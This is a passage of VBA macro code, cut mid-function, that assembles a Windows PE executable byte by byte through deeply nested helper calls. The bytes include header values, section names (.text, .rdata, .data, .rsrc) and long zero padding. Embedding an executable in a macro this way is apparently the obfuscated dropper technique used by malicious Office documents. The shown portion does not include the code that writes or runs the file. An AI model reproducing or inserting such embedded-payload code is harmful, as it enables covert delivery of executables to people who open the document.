    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 224), 0), 15), 1), 11), 1), 6), 0), 0), 176), 0), 0), 0), 160), 0), 0), 0), 0), 0), 0), 158), "Z"), 0), 0), 0), 16), 0), 0), 0), 192), 0), 0), 0), 0), "@"), 0), 0), 16), 0), 0), 0), 16), 0), 0), 4), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 4), 0), 0), 0), 0), 0), 0), 0), 0), "`"), 1), 0), 0), 16), 0), 0), 0), 0), 0), 0), 2), 0), 0), 0), 0), 0), 16), 0), 0), 16), 0), 0), 0), 0), 16), 0), 0), 16), 0), 0), 0), 0), 0), 0), 16), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "l"), 199), 0), 0), "x"), 0), 0), 0), 0), "P"), 1), 0), 200), 7), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 224), 193), 0), 0), 28), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 192)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 224), 1), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), ".text"), 0), 0), 0), "f"), 169), 0), 0), 0), 16), 0), 0), 0), 176), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 16), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), " "), 0), 0), "`.rdata"), 0), 0), 230), 15), 0), 0), 0), 192), 0), 0), 0), 16), 0), 0), 0), 192), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), "@"), 0), 0), "@.data"), 0), 0), 0), "\p"), 0), 0), 0), 208), 0), 0), 0), "@"), 0), 0), 0), 208), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 0), 0), 192)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(strPE, ".rsrc"), 0), 0), 0), 200), 7), 0), 0), 0), "P"), 1), 0), 0), 16), 0), 0), 0), 16), 1), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 0), 0), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)

    PE0 = strPE
End Function

Private Function PE1() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
